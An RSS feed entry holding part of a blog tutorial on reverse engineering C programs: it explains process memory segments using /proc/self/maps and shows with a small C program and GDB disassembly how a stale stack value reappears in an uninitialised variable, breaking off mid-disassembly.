<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Linux on Connected</title>
    <link>https://ayedaemon.github.io/tags/linux/</link>
    <description>Recent content in Linux on Connected</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 02 Apr 2024 17:19:43 +0530</lastBuildDate>
    <atom:link href="https://ayedaemon.github.io/tags/linux/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Intro to RE: C : part-4</title>
      <link>https://ayedaemon.github.io/post/2023/05/intro-to-re-part-4/</link>
      <pubDate>Mon, 01 May 2023 02:34:50 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2023/05/intro-to-re-part-4/</guid>
      <description>Some things about process and stack memory</description>
      <content:encoded><![CDATA[<p>When an operating system (OS) runs a program, the program is first loaded into main memory. Memory is utilized for both program&rsquo;s machine instructions and program&rsquo;s data&hellip;this includes parameters, dynamic variables, (un)initialized variables, and so on.</p>
<p>Most computers today use paged memory allocations, which allow the amount of memory assigned to a program to increase/decrease as the needs of the application change. Memory is allocated to the program and reclaimed by the operating system in fixed-size chunks known as <code>pages</code>. When a program is loaded into a paged-memory computer, the operating system initially allocates a small number of pages to the program and then allocates additional memory as needed.</p>
<p>On a linux machine you can check the memory layout of a running program using <code>cat /proc/&lt;proc_id&gt;/map</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">maps</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5db535000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5db537000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">917947</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span>
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5db537000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5db53b000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span> <span class="mi">00002000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">917947</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span>
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5db53b000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5db53d000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00006000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">917947</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span>
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5db53d000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5db53e000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00007000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">917947</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span>
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5db53e000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5db53f000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00008000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">917947</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span>
</span></span><span class="line"><span class="cl"><span class="mi">55</span><span class="n">f5dd440000</span><span class="o">-</span><span class="mi">55</span><span class="n">f5dd461000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                          <span class="p">[</span><span class="n">heap</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2800000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2aea000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">929341</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">locale</span><span class="o">/</span><span class="n">locale</span><span class="o">-</span><span class="n">archive</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2ba4000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2bc9000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2bc9000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2beb000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923932</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2beb000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2d45000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span> <span class="mi">00022000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923932</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2d45000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2d9d000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">0017</span><span class="n">c000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923932</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2d9d000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2da1000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">001</span><span class="n">d4000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923932</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2da1000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2da3000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">001</span><span class="n">d8000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923932</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">libc</span><span class="o">.</span><span class="n">so</span><span class="o">.</span><span class="mi">6</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2da3000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2db2000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2dd0000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2dd1000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923793</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2dd1000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2df7000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span> <span class="mi">00001000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923793</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2df7000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2e01000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00027000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923793</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2e01000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2e03000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00031000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923793</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">f0db2e03000</span><span class="o">-</span><span class="mi">7</span><span class="n">f0db2e05000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00033000</span> <span class="mi">08</span><span class="p">:</span><span class="mi">02</span> <span class="mi">923793</span>                     <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">ffd55089000</span><span class="o">-</span><span class="mi">7</span><span class="n">ffd550aa000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                          <span class="p">[</span><span class="n">stack</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">ffd550f6000</span><span class="o">-</span><span class="mi">7</span><span class="n">ffd550fa000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                          <span class="p">[</span><span class="n">vvar</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="mi">7</span><span class="n">ffd550fa000</span><span class="o">-</span><span class="mi">7</span><span class="n">ffd550fc000</span> <span class="n">r</span><span class="o">-</span><span class="n">xp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                          <span class="p">[</span><span class="n">vdso</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ffffffffff600000</span><span class="o">-</span><span class="n">ffffffffff601000</span> <span class="o">--</span><span class="n">xp</span> <span class="mi">00000000</span> <span class="mi">00</span><span class="p">:</span><span class="mi">00</span> <span class="mi">0</span>                  <span class="p">[</span><span class="n">vsyscall</span><span class="p">]</span>
</span></span></code></pre></div><p>When you read the contents of <code>/proc/self/map</code>, you will encounter multiple lines, with each line representing a separate memory mapping region. Each line contains various fields separated by whitespace, representing different attributes of the memory mapping. The common fields include:</p>
<ul>
<li><strong>Start and End Addresses</strong>: The starting and ending virtual addresses of the memory mapping region.</li>
<li><strong>Permissions</strong>: The permissions assigned to the memory mapping, such as read, write, and execute.</li>
<li><strong>Offset</strong>: The offset in the file (if the mapping is backed by a file) or zero otherwise.</li>
<li><strong>Device and Inode</strong>: The device and inode number of the file backing the mapping.</li>
<li><strong>File descriptor</strong>: If the mapping is associated with a file opened by the process, the file descriptor number is mentioned in this field.</li>
<li><strong>Flags</strong>: Additional flags indicating special characteristics of the mapping.</li>
<li><strong>Inode and Path</strong>: The inode number and path of the file backing the mapping (if available).</li>
</ul>
<h2 id="memory-layout-of-a-process">Memory layout of a process</h2>
<p>Memory space allocated to a running program/process is called process memory (AKA virtual memory). It allows multiple programs to run concurrently and provides each program with a dedicated and isolated memory space. The purpose of process memory is to facilitate the execution of programs by providing a private address space for each process, shielding them from interfering with one another.</p>
<p>A typical memory layout consists of many segments.</p>
<ol>
<li>Text segment (code segment)</li>
<li>Initialized data segment (data segment)</li>
<li>Uninitialized data segment (bss segment)</li>
<li>Heap</li>
<li>Stack</li>
</ol>
<h3 id="text-segment-code-segment">Text segment (Code Segment)</h3>
<p>The code segment contains the executable instructions of the program. It is typically read-only and stores the program&rsquo;s machine code instructions, constants, and literals.</p>
<h3 id="initialized-data-segment-data-segment">Initialized data segment (Data Segment)</h3>
<p>This segment contains initialized static variables like global variables and local static variables which have a defined value and can be modified.</p>
<h3 id="uninitialized-data-segment-bss-segment">Uninitialized data segment (BSS Segment)</h3>
<p>This segment contains uninitialized static data, both variables and constants. On most systems, kernel automatically zeros this segment.</p>
<h3 id="heap">Heap</h3>
<p>This segment contains dynamically allocated memory. It is usually managed by malloc, calloc, realloc, free (and their sibling functions too). The heap segment is shared by all threads, shared libraries, and dynamically loaded modules in a process. Heap memory segment grows towards higher memory addresses.</p>
<h3 id="stack">Stack</h3>
<p>This region of memory is used for managing function calls and local variables. It is an essential part of the execution environment and plays a crucial role in program flow control.</p>
<p>This is typically located in higher parts of the memory and grows towards lower parts (towards heap memory). A <strong>stack pointer</strong> register keeps track of the top of the stack, this gets adjusted each time a new value is pushed to or poped from the stack.</p>
<p><img loading="lazy" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Program_memory_layout.pdf/page1-225px-Program_memory_layout.pdf.jpg#center" alt=""  />
</p>
<p>This is what the whole memory layout looks like altogether, but in this article we are focusing mainly on stack segment.</p>
<h2 id="more-about-stack-practical">More about stack (practical)</h2>
<p>Stack memory is organized into stack frames, each representing the activation record of a function call. A stack frame contains information such as function parameters, local variables, return addresses, and other metadata necessary for function execution.</p>
<p>Let&rsquo;s start with a simple example of function calls to understand how stack works.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// Prints are garbage value from stack and returns the same.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">func2</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">int</span> <span class="n">var2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;var2 (%p) = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var2</span><span class="p">,</span> <span class="n">var2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">var2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Prints var1 value as 55 and returns it.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">func1</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="kt">int</span> <span class="n">var1</span> <span class="o">=</span> <span class="mi">55</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">   <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;var1 (%p) = %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">var1</span><span class="p">,</span> <span class="n">var1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="n">var1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Main function
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Calls both functions and stores their return values
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="kt">int</span> <span class="n">v1</span> <span class="o">=</span> <span class="nf">func1</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">   <span class="kt">int</span> <span class="n">v2</span> <span class="o">=</span> <span class="nf">func2</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Compares their return values and print message
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="k">if</span><span class="p">(</span><span class="n">v1</span> <span class="o">==</span> <span class="n">v2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Both values are equal</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">   <span class="k">else</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Both values are not equal</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="k">return</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>To get a better understanding for this, I&rsquo;ll put this down in steps of what this program will do upon execution.</p>
<ol>
<li>Call <code>func1()</code>, get a return value and store that in <code>v1</code> variable.</li>
<li>Call <code>func2()</code>, get a return value and store that in <code>v2</code> variable</li>
<li>Compare both values and print appropriate message.</li>
</ol>
<p>That&rsquo;s it. Quite straightforward, isn&rsquo;t it?. Let&rsquo;s see the output of this program before jumping to conclusions.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">var1</span> <span class="p">(</span><span class="mh">0x7ffeaf266d1c</span><span class="p">)</span> <span class="o">=</span> <span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="n">var2</span> <span class="p">(</span><span class="mh">0x7ffeaf266d1c</span><span class="p">)</span> <span class="o">=</span> <span class="mi">55</span>
</span></span><span class="line"><span class="cl"><span class="n">Both</span> <span class="n">values</span> <span class="n">are</span> <span class="n">equal</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://media.giphy.com/media/edGzBC6GDOhutW32ps/giphy.gif#center" alt=""  />
</p>
<p>Both <code>var1</code> and <code>var2</code> have same values and infact have same memory addresses&hellip; even though they belong to different functions and have separate stack frame and everything.</p>
<p>To understand this we&rsquo;ll have to go deeper with a debugger (I&rsquo;m using GDB).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">disas</span> <span class="n">main</span>
</span></span><span class="line"><span class="cl"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011a6</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	    <span class="n">push</span>   <span class="n">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011a7</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// Creating space in stack for variables. 0x10 is 16 bytes (4 bytes for each int variable)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="c1">// 4(v1) + 4(v2) + 8 (padding)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011aa</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;:</span>	    <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// Function call and store value in [rbp-0x4]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011ae</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011b3</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1174</span> <span class="o">&lt;</span><span class="n">func1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011b8</span> <span class="o">&lt;+</span><span class="mi">18</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">],</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// Another function call and store value in [rbp-0x8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011bb</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011c0</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1149</span> <span class="o">&lt;</span><span class="n">func2</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011c5</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">],</span><span class="n">eax</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// Compare values stored in [rbp-0x4] &amp; [rbp-0x8]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011c8</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011cb</span> <span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// if not equal then jump to &lt;main+59&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011ce</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x11e1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">59</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// else print this message
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011d0</span> <span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xe4d</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x2024</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011d7</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011da</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// And finally jump to &lt;main+74&gt; (epilogue)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011df</span> <span class="o">&lt;+</span><span class="mi">57</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x11f0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">74</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// if comparision failed: land here and print this message
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011e1</span> <span class="o">&lt;+</span><span class="mi">59</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0xe52</span><span class="p">]</span>        <span class="err">#</span> <span class="mh">0x203a</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011e8</span> <span class="o">&lt;+</span><span class="mi">66</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011eb</span> <span class="o">&lt;+</span><span class="mi">69</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x1030</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">// Finally epilogue - set return value and leave
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x00000000000011f0</span> <span class="o">&lt;+</span><span class="mi">74</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xa</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011f5</span> <span class="o">&lt;+</span><span class="mi">79</span><span class="o">&gt;:</span>	<span class="n">leave</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x00000000000011f6</span> <span class="o">&lt;+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="n">ret</span>
</span></span><span class="line"><span class="cl"><span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
</span></span></code></pre></div><p>In the disassembly code, the <code>main</code> function calls both the functions and stores their respective return values in <code>[rbp-0x4]</code> and <code>[rbp-0x8]</code> memory locations. Since these variables are specific to <code>main</code> function, they will be created in the stack memory (inside the stack frame for <code>main</code> function).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&gt;&gt;&gt;</span> <span class="n">disas</span> <span class="n">func1</span>
</span></span><span class="line"><span class="cl"><span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="nl">func1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Prologue
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="mh">0x0000000000001174</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	    <span class="n">push</span>   <span class="n">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="mh">0x0000000000001175</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	    <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span><span class="n">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="c1">// Create memory for the variable -- 4(var1) + 12(padding) = 16 (0x10)
